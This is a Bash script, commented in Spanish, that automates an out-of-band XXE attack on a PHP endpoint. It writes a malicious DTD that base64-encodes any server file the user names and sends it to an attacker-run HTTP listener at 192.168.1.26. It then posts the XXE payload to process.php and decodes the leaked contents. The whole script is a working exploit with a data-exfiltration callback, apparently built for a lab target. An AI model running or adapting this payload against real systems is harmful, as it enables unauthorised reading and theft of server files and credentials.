#!/bin/bash
# script que realiza una lectura de un archivo en el servidor a traves de una entidad externa con un DTD malicioso
# captura la salida en base64 y la decodifica para obtener el contenido del archivo

# echo -n  el parametro -n hace que no se haga un salto de linea
echo -ne "Introducir el archivo a leer -> " && read archivo


malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$archivo\">
<!ENTITY % eval \"<!ENTITY &#x25; extrafile SYSTEM 'http://192.168.1.26:80/?key=%file;'>\">
%eval;
%extrafile;
"""

# sobreescribimos el archivo malicious.dtd con el contenido del DTD malicioso
echo $malicious_dtd > malicious.dtd

python -m http.server 80 &>response &
PID=$!

sleep 2

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.26/malicious.dtd"> %xxe;]>
<root><name>test</name><tel>12345678</tel><email>prueba@ma.co</email><password>esqwer</password></root>'

cat response | grep -oP "/?key=\K[^.*\s]+" | base64 -d

kill -9 $PID

# para que el proceso no se quede en segundo plano y se efectue el kill correctamente
wait $PID
rm response 2>/dev/null

